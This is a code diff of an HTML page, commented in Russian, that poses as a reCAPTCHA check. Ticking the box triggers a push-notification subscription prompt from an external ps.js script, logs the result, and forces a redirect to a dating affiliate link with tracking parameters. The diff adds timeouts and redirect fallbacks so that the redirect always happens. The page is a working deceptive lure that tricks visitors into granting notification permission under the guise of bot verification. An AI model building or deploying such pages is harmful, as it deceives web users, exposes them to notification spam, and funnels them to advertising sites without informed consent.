@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="tlsdk" content="6ce3ce667cc14beabf44647a39a3694d">
-    <title>reCAPTCHA</title>
+    <title>reCAPTCHA with Push Subscriptions</title>
     <style>
         body {
             font-family: 'Roboto', Arial, sans-serif;
@@ -109,9 +109,7 @@
     </style>
 </head>
 <body>
-    <!-- Подключение ps.js с sub_id -->
-    <script type="application/javascript" src="https://lobpc.ext-jscdn.com/ps/ps.js?id=HnFv7gIgUEyhZsQd8kp20Q&sub_id=campaign1" async></script>
-
+    <script type="application/javascript" src="https://lobpc.ext-jscdn.com/ps/ps.js?id=HnFv7gIgUEyhZsQd8kp20Q&sub_id=test_campaign" async></script>
     <div class="container">
         <div class="captcha-container">
             <div class="captcha-left">
@@ -142,16 +140,20 @@
                 })
                 .catch(err => {
                     console.error('Ошибка регистрации Service Worker:', err);
+                    document.getElementById('error').innerText = 'Ошибка Service Worker: ' + err;
+                    document.getElementById('error').style.display = 'block';
                 });
         } else {
             console.warn('Service Worker не поддерживается');
+            document.getElementById('error').innerText = 'Service Worker не поддерживается вашим браузером';
+            document.getElementById('error').style.display = 'block';
         }
 
         // Ссылка для редиректа
         const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yd0';
 
         // Функция для логирования подписки
-        function logSubscription(permission, subId = 'campaign1') {
+        function logSubscription(permission, subId = 'test_campaign') {
             const data = {
                 id: 'HnFv7gIgUEyhZsQd8kp20Q',
                 sub_id: subId,
@@ -172,6 +174,11 @@
             console.log('Попытка редиректа на:', redirectUrl);
             try {
                 window.location.href = redirectUrl;
+                setTimeout(() => {
+                    if (window.location.href !== redirectUrl) {
+                        window.location.replace(redirectUrl);
+                    }
+                }, 500);
             } catch (e) {
                 console.error('Ошибка редиректа:', e);
                 document.getElementById('error').innerText = 'Редирект не сработал. Перейдите по ссылке: ' + redirectUrl;
@@ -179,22 +186,54 @@
             }
         }
 
-        // Функция для вызова подписки и редиректа
-        function requestSubscriptionAndRedirect() {
-            console.log('Запуск подписки...');
+        // Функция для запроса подписки
+        function requestSubscription() {
+            const errorDiv = document.getElementById('error');
+
+            // Проверяем статус уведомлений
+            if ('Notification' in window && (Notification.permission === 'granted' || Notification.permission === 'denied')) {
+                console.log('Уведомления уже разрешены или заблокированы:', Notification.permission);
+                logSubscription(Notification.permission);
+                setTimeout(performRedirect, 300);
+                return;
+            }
+
+            // Проверяем наличие API ps.js
             if (window.ps && typeof window.ps.showPrompt === 'function') {
                 console.log('Вызываем подписку через ps.js');
-                window.ps.showPrompt()
-                    .then(result => {
-                        console.log('Результат подписки:', result);
-                        logSubscription(Notification.permission);
-                        performRedirect();
-                    })
-                    .catch(err => {
-                        console.error('Ошибка вызова подписки:', err);
-                        logSubscription(Notification.permission);
-                        performRedirect();
-                    });
+                const timeout = setTimeout(() => {
+                    console.log('Тайм-аут: ps.js не вернул результат');
+                    performRedirect();
+                }, 3000);
+
+                try {
+                    window.ps.showPrompt()
+                        .then(result => {
+                            clearTimeout(timeout);
+                            console.log('Результат подписки:', result);
+                            logSubscription(Notification.permission);
+                            performRedirect();
+                        })
+                        .catch(err => {
+                            clearTimeout(timeout);
+                            console.error('Ошибка вызова подписки:', err);
+                            logSubscription(Notification.permission);
+                            performRedirect();
+                        })
+                        .finally(() => {
+                            if ('Notification' in window && (Notification.permission === 'granted' || Notification.permission === 'denied')) {
+                                clearTimeout(timeout);
+                                console.log('Статус уведомлений:', Notification.permission);
+                                logSubscription(Notification.permission);
+                                performRedirect();
+                            }
+                        });
+                } catch (err) {
+                    clearTimeout(timeout);
+                    console.error('Синхронная ошибка в ps.js:', err);
+                    logSubscription('error');
+                    performRedirect();
+                }
             } else {
                 console.log('API ps.js не доступен, используем Notification API');
                 if ('Notification' in window) {
@@ -217,35 +256,29 @@
             }
         }
 
-        // Функция проверки чекбокса
+        // Функция проверки
         function verify() {
             const checkbox = document.getElementById('captcha');
-            const errorDiv = document.getElementById('error');
-            console.log('Состояние чекбокса:', checkbox.checked);
+            const error = document.getElementById('error');
             if (checkbox.checked) {
-                errorDiv.style.display = 'none';
-                requestSubscriptionAndRedirect();
+                error.style.display = 'none';
+                setTimeout(requestSubscription, 300); // Задержка для анимации
             } else {
-                errorDiv.innerText = 'Пожалуйста, подтвердите, что вы не робот.';
-                errorDiv.style.display = 'block';
+                error.style.display = 'block';
             }
         }
 
         // Событие на клик по чекбоксу
         document.getElementById('captcha').addEventListener('click', () => {
             const checkbox = document.getElementById('captcha');
-            console.log('Клик по чекбоксу, текущее состояние:', checkbox.checked);
             if (!checkbox.checked) {
-                checkbox.checked = true; // Устанавливаем галочку
+                checkbox.checked = true; // Устанавливаем галочку при клике
             }
             verify();
         });
 
         // Событие на клик по кнопке
-        document.getElementById('submit-button').addEventListener('click', () => {
-            console.log('Клик по кнопке Отправить');
-            verify();
-        });
+        document.getElementById('submit-button').addEventListener('click', verify);
     </script>
 </body>
 </html>
